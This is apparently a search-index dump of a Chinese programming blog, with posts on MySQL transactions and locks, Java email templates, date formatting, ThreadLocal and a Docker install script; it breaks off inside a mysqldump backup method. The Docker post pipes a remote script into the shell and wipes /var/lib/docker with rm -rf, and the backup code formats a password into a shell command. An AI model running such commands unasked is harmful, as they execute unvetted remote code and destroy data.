log可能需要提供MVCC机制，因此不能再事务提交时就进行删除。提交时放入undo log链表，等待purge线程进行最后的删除。 ❝ 补充：purge线程两个主要作用是：清理undo页和清除page里面带有Delete_Bit标识的数据行。在InnoDB中，事务中的Delete操作实际上并不是真正的删除掉数据行，而是一种Delete Mark操作，在记录上标识Delete_Bit，而不删除记录。是一种\"假删除\",只是做了个标记，真正的删除工作需要后台purge线程去完成。 ❞ 这里我们就来看看insert undo log的结构，如下： insert undo 在上图中，undo type记录的是undo log的类型，对于insert undo log，该值始终为11（TRX_UNDO_INSERT_REC），undo no在一个事务中是从0开始递增的，也就是说只要事务没提交，每生成一条undo日志，那么该条日志的undo no就增1。table id记录undo log所对应的表对象。如果记录中的主键只包含一个列，那么在类型为TRX_UNDO_INSERT_REC的undo日志中只需要把该列占用的存储空间大小和真实值记录下来，如果记录中的主键包含多个列（复合主键），那么每个列占用的存储空间大小和对应的真实值都需要记录下来（图中的len就代表列占用的存储空间大小，value就代表列的真实值），「在回滚时只需要根据主键找到对应的列然后删除即可」。end of record记录了下一条undo log在页面中开始的地址，start of record记录了本条undo log在页面中开始的地址。 对undo log有一定了解后，我们再回头看看文章开头的例子，分析下为什么undo log能保证原子性 // 第一步：开始事务 start transaction; // 第二步：A账户余额减少减少1000 update balance set money = money -500 where name= ‘A’; // 第三步：B账户余额增加1000 update balance set money = money +500 where name= ‘B’; // 第四步：提交事务 commit; undo redo 考虑到排版，这里我只画了一条语句的流程图，第二条也是一样的，每次更新或者插入前，先记录undo，再修改内存中数据，再记录redo。 ","date":"2023-09-27","objectID":"/posts/mysql%E4%BA%8B%E5%8A%A1%E5%A4%84%E7%90%86%E5%8E%9F%E7%90%86/:7:2","tags":["Mysql事务"],"title":"Mysql事务处理原理","uri":"/posts/mysql%E4%BA%8B%E5%8A%A1%E5%A4%84%E7%90%86%E5%8E%9F%E7%90%86/"},{"categories":["数据库"],"content":"隔离性实现原理 我们知道，一个事务中的读操作是不会影响到另外一个事务的，所以在讨论隔离性我们主要分为两种情况 一个事务中的写操作，对另外一个事务中写操作的影响 一个事务中的写操作，对另外一个事务中读操作的影响 写操作之间的隔离是通过锁来实现的，MySQL中的锁机制要详细来讲是很复杂的，要讲明白整个锁需要从索引开始介绍，限于笔者能力及文章篇幅，本文只对MySQL中的锁机制做一个简单的介绍 MySQL中的锁机制（InnoDB） 读锁跟写锁 读锁又称为共享锁`，简称S锁，顾名思义，共享锁就是多个事务对于同一数据可以共享一把锁，「都能访问到数据，但是只能读不能修改。」 写锁又称为排他锁`，简称X锁，顾名思义，排他锁就是不能与其他所并存，如一个事务获取了一个数据行的排他锁，其他事务就不能再获取该行的其他锁，包括共享锁和排他锁，但是获取排他锁的事务是可以对数据就行读取和修改。 行锁跟表锁 表锁在操作数据时会锁定整张表，并发性能较差； 行锁则只锁定需要操作的数据，并发性能好。 但是由于加锁本身需要消耗资源(获得锁、检查锁、释放锁等都需要消耗资源)，因此在锁定数据较多情况下使用表锁可以节省大量资源。MySQL中不同的存储引擎支持的锁是不一样的，例如MyIsam只支持表锁，而InnoDB同时支持表锁和行锁，且出于性能考虑，绝大多数情况下使用的都是行锁。 意向锁 意向锁分为两种，意向读锁（IS）跟意向写锁（IX） 意向锁是表级别的锁 为什么需要意向锁呢？思考一个问题：如果我们想对某个表加一个表锁，那么在加锁之前我们需要去检查表中的每一行记录是否已经被单独加了行锁，这样的话岂不是意味着我们需要去遍历表中所有的记录依次进行检查，遍历是不可能的，这辈子都不可能遍历的，基于效率的考虑，我们可以在每次给行记录加锁时先给当前表加一个意向锁，如果我们要对行加读锁（S）的话，那么就先给表加一个意向读锁（IS），如果要对行加写锁（X）的话，那么先给表加一个意向写锁（IX），这样当我们需要给整个表加锁的时候就可以通过先判断表上是否已经存在了意向锁来决定是否可以上锁了，避免遍历，提高了效率。 意向锁跟普通的读锁写锁间的兼容性如下： IS IX S X IS 兼容 兼容 兼容 不兼容 IX 兼容 兼容 不兼容 不兼容 S 兼容 不兼容 兼容 不兼容 X 不兼容 不兼容 不兼容 不兼容 注：IS（意向读锁/意向共享锁）， IX（意向写锁/意向排他锁）， S（读锁/共享锁），X（写锁/排他锁） 从上图中可以看出，意向锁之间都是兼容的，这是因为意向锁的作用仅仅是来快速判断是否可以直接上表锁。 「接下来介绍的这几种锁都属于行锁」，为了更好的理解这几种锁，我们先创建一个表 CREATE TABLE `user` ( `id` int(11) NOT NULL AUTO_INCREMENT, `name` varchar(10) NOT NULL, PRIMARY KEY (`id`), ) ENGINE=InnoDB AUTO_INCREMENT=7 DEFAULT CHARSET=utf8; 其中id为主键，没有建其余的索引，插入如下数据 INSERT INTO `test`.`user`(`id`, `name`) VALUES (1, 'a张大胆'); INSERT INTO `test`.`user`(`id`, `name`) VALUES (3, 'b王翠花'); INSERT INTO `test`.`user`(`id`, `name`) VALUES (6, 'c范统'); INSERT INTO `test`.`user`(`id`, `name`) VALUES (8, 'd朱逸群'); INSERT INTO `test`.`user`(`id`, `name`) VALUES (15, 'e董格求'); Record Lock（记录锁） 锁定单条记录 也分为S锁跟X锁 如果我们对id为3的记录添加一个行锁，对应如下（图中每一列代表数据库中的一行记录）： 行锁 Gap Lock（间隙锁） 锁定一个范围，但是不包含记录本身 间隙锁的主要作用在于防止幻读的发生，虽然也有S锁跟X锁的区分，但是它们的作用都是相同的，而且如果你对一条记录加了间隙锁（不论是共享间隙锁还是独占间隙锁），并不会限制其他事务对这条记录加记录锁或者继续加间隙锁，再强调一遍，间隙锁的作用仅仅是为了防止幻读的发生。 假设我们要对id为6的记录添加间隙锁，那么此时锁定的区域如下所示 其中虚线框代表的是要锁定的间隙，其实就是当前需要加间隙锁的记录跟上一条记录之间的范围，但是间隙锁不会锁定当前记录，如图所示，id=6的记录并没有被加锁。（图中虚线框表锁间隙，没有插入真实的记录） 间隙锁 Next-Ke","date":"2023-09-27","objectID":"/posts/mysql%E4%BA%8B%E5%8A%A1%E5%A4%84%E7%90%86%E5%8E%9F%E7%90%86/:7:3","tags":["Mysql事务"],"title":"Mysql事务处理原理","uri":"/posts/mysql%E4%BA%8B%E5%8A%A1%E5%A4%84%E7%90%86%E5%8E%9F%E7%90%86/"},{"categories":["前端"],"content":"问题描述 部署WEB项目后，开启了强制HTTPS，产生如下错误： hubu8.github.io/:1 Mixed Content: The page at 'https://hubu8.github.io/friend/' was loaded over HTTPS, but requested an insecure image 'http://www.ruoyi.vip/images/ruoyi_vue.png'. This request has been blocked; the content must be served over HTTPS. ","date":"2023-09-13","objectID":"/posts/https%E7%AB%99%E7%82%B9%E6%97%A0%E6%B3%95%E4%BD%BF%E7%94%A8http%E8%B5%84%E6%BA%90/:0:1","tags":["https"],"title":"https站点无法使用http资源","uri":"/posts/https%E7%AB%99%E7%82%B9%E6%97%A0%E6%B3%95%E4%BD%BF%E7%94%A8http%E8%B5%84%E6%BA%90/"},{"categories":["前端"],"content":"问题分析 报错的原因就是当前页面是https协议加载的，但是这个页面发起了一个http的ajax请求，这种做法是非法的。HTTPS页面里动态的引入HTTP资源，比如引入一个js文件，会被直接block掉的.在HTTPS页面里通过AJAX的方式请求HTTP资源，也会被直接block掉的。 ","date":"2023-09-13","objectID":"/posts/https%E7%AB%99%E7%82%B9%E6%97%A0%E6%B3%95%E4%BD%BF%E7%94%A8http%E8%B5%84%E6%BA%90/:0:2","tags":["https"],"title":"https站点无法使用http资源","uri":"/posts/https%E7%AB%99%E7%82%B9%E6%97%A0%E6%B3%95%E4%BD%BF%E7%94%A8http%E8%B5%84%E6%BA%90/"},{"categories":["前端"],"content":"解决办法 可以在相应的页面的里加上这句代码，意思是自动将http的不安全请求升级为https \u003cmeta http-equiv=\"Content-Security-Policy\" content=\"upgrade-insecure-requests\"\u003e ","date":"2023-09-13","objectID":"/posts/https%E7%AB%99%E7%82%B9%E6%97%A0%E6%B3%95%E4%BD%BF%E7%94%A8http%E8%B5%84%E6%BA%90/:0:3","tags":["https"],"title":"https站点无法使用http资源","uri":"/posts/https%E7%AB%99%E7%82%B9%E6%97%A0%E6%B3%95%E4%BD%BF%E7%94%A8http%E8%B5%84%E6%BA%90/"},{"categories":["Java后端"],"content":"1. 环境准备 ","date":"2023-09-13","objectID":"/posts/javamailsender%E5%AE%9E%E7%8E%B0%E5%8F%91%E9%80%81%E9%82%AE%E4%BB%B6/:1:0","tags":["Email"],"title":"javaMailSender实现发送邮件","uri":"/posts/javamailsender%E5%AE%9E%E7%8E%B0%E5%8F%91%E9%80%81%E9%82%AE%E4%BB%B6/"},{"categories":["Java后端"],"content":"1.1 邮件服务 SpringBoot邮件服务的搭建流程为： 引入邮件服务依赖 配置邮件发送邮箱服务器、账户、密码等信息 使用SpringBoot内置javaMailSender工具实现邮件发送方法 \u003cdependency\u003e \u003cgroupId\u003eorg.springframework.boot\u003c/groupId\u003e \u003cartifactId\u003espring-boot-starter-mail\u003c/artifactId\u003e \u003c/dependency\u003e \u003cdependency\u003e \u003cgroupId\u003eorg.springframework.boot\u003c/groupId\u003e \u003cartifactId\u003espring-boot-starter-thymeleaf\u003c/artifactId\u003e \u003c/dependency\u003e spring.mail.host=smtp.163.com（host） spring.mail.username=邮箱地址 spring.mail.password=邮箱密码 spring.mail.port=25 spring.mail.default-encoding=UTF-8 spring.mail.properties.mail.smtp.socketFactoryClass=javax.net.ssl.SSLSocketFactory spring.mail.properties.mail.smtp.debug=true ","date":"2023-09-13","objectID":"/posts/javamailsender%E5%AE%9E%E7%8E%B0%E5%8F%91%E9%80%81%E9%82%AE%E4%BB%B6/:1:1","tags":["Email"],"title":"javaMailSender实现发送邮件","uri":"/posts/javamailsender%E5%AE%9E%E7%8E%B0%E5%8F%91%E9%80%81%E9%82%AE%E4%BB%B6/"},{"categories":["Java后端"],"content":"1.2 Thymeleaf环境 Thymeleaf的使用流程可以简单概括为： 引入Thymeleaf依赖信息 配置文件中设置Thymeleaf基础属性 resource/templates下定义Thymeleaf使用的html文件 定义接口服务指向Thymeleaf模板文件，并将属性数据传参 Thymeleaf文件中使用相关语法展示后端传参内容 ","date":"2023-09-13","objectID":"/posts/javamailsender%E5%AE%9E%E7%8E%B0%E5%8F%91%E9%80%81%E9%82%AE%E4%BB%B6/:1:2","tags":["Email"],"title":"javaMailSender实现发送邮件","uri":"/posts/javamailsender%E5%AE%9E%E7%8E%B0%E5%8F%91%E9%80%81%E9%82%AE%E4%BB%B6/"},{"categories":["Java后端"],"content":"2. 模板邮件实现 ","date":"2023-09-13","objectID":"/posts/javamailsender%E5%AE%9E%E7%8E%B0%E5%8F%91%E9%80%81%E9%82%AE%E4%BB%B6/:2:0","tags":["Email"],"title":"javaMailSender实现发送邮件","uri":"/posts/javamailsender%E5%AE%9E%E7%8E%B0%E5%8F%91%E9%80%81%E9%82%AE%E4%BB%B6/"},{"categories":["Java后端"],"content":"2.1 Thymeleaf 定义邮件模板首先使用Thymeleaf定义一个静态的html文件，并利用Thymeleaf与服务接口变量的绑定特性，动态的改变邮件模板中的参数内容。 如定义一个html邮件模板文件： \u003c!DOCTYPE html\u003e \u003chtml lang=\"en\" xmlns:th=\"http://www.thymeleaf.org\"\u003e \u003chead\u003e \u003cmeta charset=\"UTF-8\"\u003e \u003ctitle\u003eTitle\u003c/title\u003e \u003c/head\u003e \u003cbody\u003e \u003cp\u003e【东源学院】尊敬的东源学院用户：\u003c/p\u003e \u003cp\u003e我们收到了一项请求，要求通过您的电子邮件\u003cspan th:text=\"${email}\"\u003e您的账户，您的【东源学院】验证码为：\u003c/span\u003e\u003c/p\u003e \u003ch2 style=\"text-align: center;\" th:text=\"${code}\"\u003e\u003c/h2\u003e \u003cp\u003e如果您并未请求此验证码，则可能是他人正在尝试访问以下 【东源学院】 帐号：\u003cspan th:text=\"${email}\"。\u003e请勿将此验证码转发给或提供给任何人。\u003c/span\u003e\u003c/p\u003e \u003cp\u003e验证码有效时间为5分钟\u003c/p\u003e \u003cdiv style=\"color: #ff1a0e\"\u003e一起努力创造辉煌\u003c/div\u003e \u003chr\u003e \u003cp\u003e此致\u003c/p\u003e \u003cp\u003e东源科技团队敬上\u003c/p\u003e \u003c/body\u003e \u003c/html\u003e 其中th:text=\"${email}\"是利用了Thymeleaf模板引擎的特性，获取服务返回的参数信息，并展示到html页面中。 ","date":"2023-09-13","objectID":"/posts/javamailsender%E5%AE%9E%E7%8E%B0%E5%8F%91%E9%80%81%E9%82%AE%E4%BB%B6/:2:1","tags":["Email"],"title":"javaMailSender实现发送邮件","uri":"/posts/javamailsender%E5%AE%9E%E7%8E%B0%E5%8F%91%E9%80%81%E9%82%AE%E4%BB%B6/"},{"categories":["Java后端"],"content":"2.1 TemplateEngine 为了使用定义的邮件模板，并将整个html文件内容作为html的格式邮件发送，这时就需要用到 org.thymeleaf.TemplateEngine包中的TemplateEngine类。 可以按照如下方式获取模板文件中的html内容，并填充内容： @Autowired private JavaMailSender javaMailSender; @Autowired private TemplateEngine templateEngine; @Override public boolean sendEmail(String email, String templateName, Map\u003cString, Object\u003e param) { MimeMessage mimeMessage = javaMailSender.createMimeMessage(); MimeMessageHelper helper = null; try { helper = new MimeMessageHelper(mimeMessage, true); helper.setSubject(\"欢迎使用东源学院\"); helper.setFrom(\"posttimer@163.com\"); helper.setTo(email); // helper.setCc(\"37xxxxx37@qq.com\"); // helper.setBcc(\"14xxxxx098@qq.com\"); helper.setSentDate(new Date()); // 这里引入的是Template的Context Context context = new Context(); // 设置模板中的变量 context.setVariable(\"email\", email); context.setVariable(\"code\",param.get(\"code\")); // 第一个参数为模板的名称 String process = templateEngine.process(templateName, context); // 第二个参数true表示这是一个html文本 helper.setText(process,true); javaMailSender.send(mimeMessage); return true; } catch (MessagingException e) { e.printStackTrace(); return false; } } //具体代码见：https://gitee.com/hubu8/edu_dongyuan/blob/master/service/service_msm/src/main/java/buzz/hubu/msmservice/service/impl/MsmServiceImpl.java //此仓库为私有仓库，代码仅供参考 ","date":"2023-09-13","objectID":"/posts/javamailsender%E5%AE%9E%E7%8E%B0%E5%8F%91%E9%80%81%E9%82%AE%E4%BB%B6/:2:2","tags":["Email"],"title":"javaMailSender实现发送邮件","uri":"/posts/javamailsender%E5%AE%9E%E7%8E%B0%E5%8F%91%E9%80%81%E9%82%AE%E4%BB%B6/"},{"categories":["Java后端"],"content":"3.模板升级 thymeleaf模板进数据库 @Override public boolean sendEmailByTemplate(String funcNo, String email, Map\u003cString, Object\u003e param) { QueryWrapper\u003cEmailTemplate\u003e emailTemplateQueryWrapper = new QueryWrapper\u003c\u003e(); emailTemplateQueryWrapper.eq(\"func_no\", funcNo); EmailTemplate emailTemplate = emailTemplateMapper.selectOne(emailTemplateQueryWrapper); if (emailTemplate != null) { MimeMessage mimeMessage = javaMailSender.createMimeMessage(); MimeMessageHelper helper = null; helper = new MimeMessageHelper(mimeMessage, null); try { helper.setSubject((String) param.get(\"subject\")); helper.setFrom(\"posttimer@163.com\"); helper.setTo(email); helper.setSentDate(new Date()); String template = emailTemplate.getEmailTemplate(); //parameterList:'[{\\\"name\\\": \\\"邮件\\\", \\\"fields\\\": \\\"email\\\", \\\"initValue\\\": \\\"2650523664@qq.com\\\"}, {\\\"name\\\": \\\"验证码\\\", \\\"fields\\\": \\\"code\\\", \\\"initValue\\\": \\\"152368\\\"}]' //解析参数 List\u003cFieldsDTO\u003e fieldsDTOS = JSON.parseArray(emailTemplate.getParameterList(), FieldsDTO.class); Map\u003cString, Object\u003e resultMap = new HashMap\u003c\u003e(); fieldsDTOS.forEach(i -\u003e { String fields = i.getFields(); Object initValue = i.getInitValue(); if (param.containsKey(fields)) { initValue = param.get(fields); } resultMap.put(fields, initValue); }); Context context = new Context(); context.setVariables(resultMap); TemplateEngine engine = new TemplateEngine(); String process = engine.process(template, context); helper.setText(process, true); javaMailSender.send(mimeMessage); return true; } catch (Exception e) { return false; } } return false; } // https://gitee.com/-/ide/project/hubu8/edu_dongyuan/edit/dev-v1.0.0/-/service/service_msm/src/main/java/buzz/hubu/msmservice/service/impl/MsmServiceImpl.java ","date":"2023-09-13","objectID":"/posts/javamailsender%E5%AE%9E%E7%8E%B0%E5%8F%91%E9%80%81%E9%82%AE%E4%BB%B6/:3:0","tags":["Email"],"title":"javaMailSender实现发送邮件","uri":"/posts/javamailsender%E5%AE%9E%E7%8E%B0%E5%8F%91%E9%80%81%E9%82%AE%E4%BB%B6/"},{"categories":["Java后端"],"content":"4.其他实现思路 ","date":"2023-09-13","objectID":"/posts/javamailsender%E5%AE%9E%E7%8E%B0%E5%8F%91%E9%80%81%E9%82%AE%E4%BB%B6/:4:0","tags":["Email"],"title":"javaMailSender实现发送邮件","uri":"/posts/javamailsender%E5%AE%9E%E7%8E%B0%E5%8F%91%E9%80%81%E9%82%AE%E4%BB%B6/"},{"categories":["Java后端"],"content":"Velocity模板引擎 ","date":"2023-09-13","objectID":"/posts/javamailsender%E5%AE%9E%E7%8E%B0%E5%8F%91%E9%80%81%E9%82%AE%E4%BB%B6/:4:1","tags":["Email"],"title":"javaMailSender实现发送邮件","uri":"/posts/javamailsender%E5%AE%9E%E7%8E%B0%E5%8F%91%E9%80%81%E9%82%AE%E4%BB%B6/"},{"categories":["Java后端"],"content":"freemarker 模板引擎","date":"2023-09-13","objectID":"/posts/javamailsender%E5%AE%9E%E7%8E%B0%E5%8F%91%E9%80%81%E9%82%AE%E4%BB%B6/:4:2","tags":["Email"],"title":"javaMailSender实现发送邮件","uri":"/posts/javamailsender%E5%AE%9E%E7%8E%B0%E5%8F%91%E9%80%81%E9%82%AE%E4%BB%B6/"},{"categories":["java"],"content":"写在最前面 测试代码展示YYYY与yyyy的区别： public class Test { public static void main(String[] args) { SimpleDateFormat sdf = new SimpleDateFormat(\"yyyy-MM-dd HH:mm:ss\"); String dateStr = \"2023-12-31 23:59:59\"; try { Date date = sdf.parse(dateStr); String yearLowCase = sdf.format(date); System.out.println(\"LowYearCase: \" + yearLowCase); SimpleDateFormat sdf2 = new SimpleDateFormat(\"YYYY-MM-dd HH:mm:ss\"); String yearUpperCase = sdf2.format(date); System.out.println(\"UpperYearCase: \" + yearUpperCase); } catch (ParseException e) { throw new RuntimeException(e); } } } 输出结果： LowYearCase: 2023-12-31 23:59:59 UpperYearCase: 2024-12-31 23:59:59 很明显，使用YYYY时，2023年变成了2024年，在正常情况下可能没问题，但是在跨年的时候大概率就会有问题了。 ","date":"2023-09-12","objectID":"/posts/date-formatting%E4%B8%ADyyyy%E4%B8%8Eyyyy%E7%9A%84%E5%8C%BA%E5%88%AB/:0:1","tags":["时间格式化"],"title":"Date Formatting中YYYY与yyyy的区别","uri":"/posts/date-formatting%E4%B8%ADyyyy%E4%B8%8Eyyyy%E7%9A%84%E5%8C%BA%E5%88%AB/"},{"categories":["java"],"content":"原因 与小写的yyyy不同，大写的YYYY表示一个基于周的年份。它是根据周计算的年份，而不是基于日历的年份。通常情况下，两者的结果是相同的，但在跨年的第一周或最后一周可能会有差异。 区别： yyyy使用的是日历年，我们应该使用日历年这种方式 YYYY使用的是当前周所在的年份（Week of Year） 大部分情况下这两种方式的值是一样的 避免这个问题的方法也十分简单，要有公用的格式类，所有使用日期格式的地方都引用这个类，这个类中就定义好yyyy-MM-dd想给的格式即可，这样就不会出现有人手误给大家埋雷了。 ","date":"2023-09-12","objectID":"/posts/date-formatting%E4%B8%ADyyyy%E4%B8%8Eyyyy%E7%9A%84%E5%8C%BA%E5%88%AB/:0:2","tags":["时间格式化"],"title":"Date Formatting中YYYY与yyyy的区别","uri":"/posts/date-formatting%E4%B8%ADyyyy%E4%B8%8Eyyyy%E7%9A%84%E5%8C%BA%E5%88%AB/"},{"categories":["数据库"],"content":"for update定义 ​ for update是一种行级锁，又叫排它锁，一旦用户对某个行施加了行级加锁，则该用户可以查询也可以更新被加锁的数据行，其它用户只能查询但不能更新被加锁的数据行．如果其它用户想更新该表中的数据行，则也必须对该表施加行级锁．即使多个用户对一个表均使用了共享更新，但也不允许两个事务同时对一个表进行更新，真正对表进行更新时，是以独占方式锁表，一直到提交或复原该事务为止。行锁永远是独占方式锁。 只有当出现如下之一的条件，才会释放共享更新锁： 1.执行提交（COMMIT）语句 2.退出数据库（LOG　OFF） 3.程序停止运行 ","date":"2023-09-12","objectID":"/posts/for-update%E7%9A%84%E4%BD%9C%E7%94%A8%E4%B8%8E%E7%94%A8%E6%B3%95/:0:1","tags":["for update"],"title":"for update的作用与用法","uri":"/posts/for-update%E7%9A%84%E4%BD%9C%E7%94%A8%E4%B8%8E%E7%94%A8%E6%B3%95/"},{"categories":["数据库"],"content":"概念和用法 通常情况下，select语句是不会对数据加锁，妨碍影响其他的DML和DDL操作。同时，在多版本一致读机制的支持下，select语句也不会被其他类型语句所阻碍。 而select … for update 语句是我们经常使用手工加锁语句。在数据库中执行select … for update ,大家会发现会对数据库中的表或某些行数据进行锁表，在mysql中，如果查询条件带有主键、索引，会锁行数据，如果没有，会锁表。 由于InnoDB预设是Row-Level Lock，所以只有「明确」的指定主键，MySQL才会执行Row lock (只锁住被选取的资料例) ，否则MySQL将会执行Table Lock (将整个资料表单给锁住)。 【举例说明】假设有张表user ，里面有 id 和 name 两列，id是主键。 例1: (明确指定主键，并且数据真实存在，row lock) SELECT * FROM user WHERE id=3 FOR UPDATE; SELECT * FROM user WHERE id=3 and name='Tom' FOR UPDATE; 例2: (明确指定主键，但数据不存在，无lock) SELECT * FROM user WHERE id=0 FOR UPDATE; 例3: (主键不明确，table lock) SELECT * FROM user WHERE id\u003c\u003e3 FOR UPDATE; SELECT * FROM user WHERE id LIKE '%3%' FOR UPDATE; 例4: (无主键，table lock) SELECT * FROM user WHERE name=‘Tom’ FOR UPDATE; 注意： 1.FOR UPDATE仅适用于InnoDB，且必须在事务处理模块(BEGIN/COMMIT)中才能生效。 2.要测试锁定的状况，可以利用MySQL的Command Mode(命令模式) ，开两个视窗来做测试。 3.Myisam 只支持表级锁，InnerDB支持行级锁 添加了(行级锁/表级锁)锁的数据不能被其它事务再锁定，也不被其它事务修改。是表级锁时，不管是否查询到记录，都会锁定表。 4.有普通索引或者唯一索引的情况下，也会进行行锁，情况与走主键一样 ","date":"2023-09-12","objectID":"/posts/for-update%E7%9A%84%E4%BD%9C%E7%94%A8%E4%B8%8E%E7%94%A8%E6%B3%95/:0:2","tags":["for update"],"title":"for update的作用与用法","uri":"/posts/for-update%E7%9A%84%E4%BD%9C%E7%94%A8%E4%B8%8E%E7%94%A8%E6%B3%95/"},{"categories":["数据库"],"content":"什么时候需要使用for update？ 借助for update语句，我们可以在应用程序的层面手工实现数据加锁保护操作。就是那些需要业务层面数据独占时，可以考虑使用for update。 场景上，比如火车票订票，在屏幕上显示有票，而真正进行出票时，需要重新确定一下这个数据没有被其他客户端修改。所以，在这个确认过程中，可以使用for update。 ","date":"2023-09-12","objectID":"/posts/for-update%E7%9A%84%E4%BD%9C%E7%94%A8%E4%B8%8E%E7%94%A8%E6%B3%95/:0:3","tags":["for update"],"title":"for update的作用与用法","uri":"/posts/for-update%E7%9A%84%E4%BD%9C%E7%94%A8%E4%B8%8E%E7%94%A8%E6%B3%95/"},{"categories":["数据库"],"content":"for update悲观锁 悲观锁：总是假设最坏的情况，每次去拿数据的时候都认为别人会修改，所以每次在拿数据的时候都会上锁，这样别人想拿这个数据就会阻塞直到它解锁。传统的关系型数据库里边就用到了很多这种锁机制，比如行锁，表锁等，读锁，写锁等，都是在做操作之前先上锁。就像for update，再比如Java里面的同步原语synchronized关键字的实现也是悲观锁。 乐观锁：顾名思义，就是很乐观，每次去拿数据的时候都认为别人不会修改，所以不会上锁，但是在更新的时候会判断一下在此期间别人有没有去更新这个数据，可以使用版本号等机制。乐观锁适用于多读的应用类型，这样可以提高吞吐量，像数据库提供的类似于write_condition机制，其实都是提供的乐观锁。 ","date":"2023-09-12","objectID":"/posts/for-update%E7%9A%84%E4%BD%9C%E7%94%A8%E4%B8%8E%E7%94%A8%E6%B3%95/:0:4","tags":["for update"],"title":"for update的作用与用法","uri":"/posts/for-update%E7%9A%84%E4%BD%9C%E7%94%A8%E4%B8%8E%E7%94%A8%E6%B3%95/"},{"categories":["运维"],"content":"1.复制下面命令至文件并保存 #!/bin/bash sudo systemctl stop docker.socket #删除原有docker sudo yum remove docker docker-ce docker-client docker-client-latest docker-common docker-latest docker-latest-logrotate docker-logrotate docker-selinux docker-engine-selinux docker-engine echo \"=======删除 docker服务 完成=======\" #删除镜像、容器、配置文件等内容 sudo rm -rf /var/lib/docker sudo rm -rf /etc/systemd/system/docker.service.d sudo rm -rf /var/run/docker echo \"=======删除 docker文件夹 完成=======\" #安装 docker #sudo curl -sSL https://get.daocloud.io/docker | sh sudo curl -sSL https://get.docker.com | sh #启动 docker systemctl start docker docker -v echo \"=======安装 docker 完成=======\" #设置 docker仓库为国内仓库 touch /etc/docker/daemon.json cat \u003e /etc/docker/daemon.json \u003c\u003cEOF { \"registry-mirrors\": [\"https://nrbewqda.mirror.aliyuncs.com\",\"https://dmmxhzvq.mirror.aliyuncs.com\",\"https://registry.docker-cn.com\"] } EOF #启动 docker systemctl daemon-reload systemctl restart docker echo \"=======开始安装 docker-compose 完成=======\" #安装 docker-compose sudo curl -L \"https://github.com/docker/compose/releases/download/1.29.2/docker-compose-$(uname -s)-$(uname -m)\" -o /usr/local/bin/docker-compose sudo chmod +x /usr/local/bin/docker-compose docker-compose --version echo \"=======安装 docker-compose 完成=======\" 2.给文件添加执行权限 chmod +x install-docker.sh 3./bin/bash^M: 坏的解释器: 没有那个文件或目录 ​ 我们的脚本文件在windows下编辑过，windows下每一行的结尾是\\n\\r，而在linux下文件的结尾是\\n，那么在windows下编辑过的文件在linux下打开看的时候每一行的结尾就会多出来一个字符\\r,当在linux下查看时，\\r会被替换为^M 我们使用这个命令来/r结束的字符换成空白 sed -i 's/\\r$//' xxx.sh ","date":"2023-05-29","objectID":"/posts/%E4%B8%80%E9%94%AE%E5%AE%89%E8%A3%85docker%E5%92%8Cdocker-compose/:0:0","tags":["docker"],"title":"一键安装docker和docker Compose","uri":"/posts/%E4%B8%80%E9%94%AE%E5%AE%89%E8%A3%85docker%E5%92%8Cdocker-compose/"},{"categories":["Java后端"],"content":"ThreadLocal特点 ThreadLocal是一个线程内部的变量，只在本线程中使用，隔离其他线程 ThreadLocal内部维护了一个ThreadLocalMap Thread内部引用了ThreadLocalMap ThreadLocalMap可以保存键值对，但是一个ThreadLocal只能保存一个值，并且各个线程数据互不干扰 ThreadLocalMap存储时的key永远为当前的ThreadLocal ThreadLocalMap存储时的key是弱引用的 ThreadLocalMap 每个ThreadLocal只能存储一个数据，如果需要存储多个值的话，可以定义多个ThreadLocal。ThreadLocal在内部维护了一个ThreadLocalMap用来存储这些值。 ThreadLocalMap并没有去实现Map接口，它定义了一个Entry数组，每个Entry以\u003ckey,value\u003e的形式来保存值，其中key为当前ThreadLocal本身，value为要保存的值。 ","date":"2023-05-24","objectID":"/posts/threadlocal%E5%A4%9A%E5%80%BC%E5%BA%94%E7%94%A8/:0:1","tags":["ThreadLocal"],"title":"ThreadLocal多值应用","uri":"/posts/threadlocal%E5%A4%9A%E5%80%BC%E5%BA%94%E7%94%A8/"},{"categories":["Java后端"],"content":"应用 public class UploadContext { private boolean isCompress; private String suffix; private static final ThreadLocal\u003cUploadContext\u003e current; static { current = new ThreadLocal\u003c\u003e(); } public boolean isCompress() { return isCompress; } public void setCompress(boolean compress) { isCompress = compress; } public String getSuffix() { return suffix; } public void setSuffix(String suffix) { this.suffix = suffix; } public static UploadContext getOrCreate(){ UploadContext uploadContext = current.get(); if(uploadContext == null){ uploadContext = new UploadContext(); current.set(uploadContext); } return uploadContext; } } ","date":"2023-05-24","objectID":"/posts/threadlocal%E5%A4%9A%E5%80%BC%E5%BA%94%E7%94%A8/:0:2","tags":["ThreadLocal"],"title":"ThreadLocal多值应用","uri":"/posts/threadlocal%E5%A4%9A%E5%80%BC%E5%BA%94%E7%94%A8/"},{"categories":["Java后端"],"content":"如何使用 String suffix = UploadContext.getOrCreate().getSuffix(); ","date":"2023-05-24","objectID":"/posts/threadlocal%E5%A4%9A%E5%80%BC%E5%BA%94%E7%94%A8/:0:3","tags":["ThreadLocal"],"title":"ThreadLocal多值应用","uri":"/posts/threadlocal%E5%A4%9A%E5%80%BC%E5%BA%94%E7%94%A8/"},{"categories":["Java后端"],"content":"代码解释 一个上下文变量类，里面包含上下文业务需要的参数； 静态成员变量（所有对象共享一个本地线程变量）为ThreadLocal，getOrCreate返回的是上下文变量对象（本地线程变量值），变量对象包含参数的get与set方法， ","date":"2023-05-24","objectID":"/posts/threadlocal%E5%A4%9A%E5%80%BC%E5%BA%94%E7%94%A8/:0:4","tags":["ThreadLocal"],"title":"ThreadLocal多值应用","uri":"/posts/threadlocal%E5%A4%9A%E5%80%BC%E5%BA%94%E7%94%A8/"},{"categories":["运维"],"content":"问题背景 在一个上线项目中，系统需要定时备份数据，如果系统部署方式为服务器本地环境部署或者数据库与系统应用在同一个环境内，可以通过程序调用mysqldump来备份程序，核心代码如下： /** * Cannot run program \"mysqldump\": CreateProcess error=2, 系统找不到指定的文件。 * 确保代码运行环境和MySQL在一个环境，目前还未找到好的方法 * @param username 用户名 * @param password 密码 * @param dbName 数据库名 * @param backupDir 备份路径 * @param sqlName 文件名 */ public void backUpDataBase(String username,String password,String dbName,String backupDir,String sqlName){ String backupSql = StringUtils.format(\"mysqldump -u{} -p{} {} \u003e {}/{}`date +%Y%m%d%H%M%S`.sql\", username, password, dbName, backupDir, sqlName); logger.info(StringUtils.format(\"{} 待执行的shell命令:{}\", DateUtils.getTime(),backupSql)); File folder = new File(backupDir); if (!folder.exists() \u0026\u0026 !folder.isDirectory()) { folder.mkdirs(); logger.info(StringUtils.format(\"{} 